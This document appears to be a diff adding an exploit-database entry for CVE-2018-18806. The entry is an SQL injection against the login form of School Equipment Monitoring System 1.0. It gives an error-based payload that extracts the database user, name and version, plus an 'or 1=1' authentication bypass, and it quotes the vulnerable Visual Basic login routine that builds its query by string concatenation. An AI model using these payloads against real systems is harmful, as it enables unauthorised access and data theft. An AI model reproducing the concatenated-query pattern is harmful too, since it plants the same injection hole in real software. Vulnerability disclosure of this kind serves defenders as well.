@@ -1,0 +1,57 @@
+# Exploit Title: School Equipment Monitoring System 1.0 - 'login' SQL Injection 
+# Dork: N/A
+# Date: 2018-10-29
+# Exploit Author: Ihsan Sencan
+# Vendor Homepage: https://www.sourcecodester.com/users/janobe
+# Software Link: https://www.sourcecodester.com/sites/default/files/download/janobe/sems_0.zip
+# Version: 1.0
+# Category: Windows
+# Tested on: WiN7_x64/KaLiLinuX_x64
+# CVE: CVE-2018-18806
+
+# POC: 
+# 1)
+
+User: '||(SEleCT 'Efe' FRoM DuaL WheRE 113=113 AnD (SEleCT 64 FRom(SELeCT CoUNT(*),ConCAT(ConCAT(0x203a20,UsER(),DAtABAsE(),VErSIoN()),(SelEcT (ELT(64=64,1))),FLooR(RAnD(0)*2))x FrOM INFOrMATIoN_SchEMA.pLUGINS GroUP By x)a))||'
+Pass: Null
+
+# POC: 
+# 2)
+# User: 'or 1=1 or ''='
+# Pass: Null
+# 
+# https://4.bp.blogspot.com/-ILPqY1iygBY/W9YnEkjH9fI/AAAAAAAAENQ/34rcdTiwPDIeBzPhuj8roYPMIPOshiFvwCLcBGAs/s1600/sql2.png
+# 
+#[PATH]/include/user.vb / 28 / '" & username & "'
+#....
+#24     Public Sub login(ByVal username As Object, ByVal pass As Object)
+#25         Try
+#26 
+#27             con.Open()
+#28             reloadtxt("SELECT * FROM `tbluseraccounts` WHERE Username= '" & username & "' and Pass = sha1('" & pass & "')")
+#29 
+#30 
+#31             If dt.Rows.Count > 0 Then
+#32 
+#33                 If dt.Rows(0).Item("Role") = "Administrator" Then
+#34                     MsgBox("Welcome " & dt.Rows(0).Item("Role"))
+#35                     Form1.Text = "User :" & dt.Rows(0).Item("Fullname")
+#36                     Form1.LogoutToolStripMenuItem.Text = "Logout"
+#37                     visibleMenu("true", "admin")
+#38                     LoginForm1.Close()
+#39                 Else
+#40                     visibleMenu("true", "not admin")
+#41                     Form1.LogoutToolStripMenuItem.Text = "Logout"
+#42                     LoginForm1.Close()
+#43                 End If
+#44 
+#45             Else
+#46                 MsgBox("Acount doest not exits!", MsgBoxStyle.Information)
+#47             End If
+#48         Catch ex As Exception
+#49             MsgBox(ex.Message)
+#50         End Try
+#51         con.Close()
+#52         da.Dispose()
+#53     End Sub
+#....
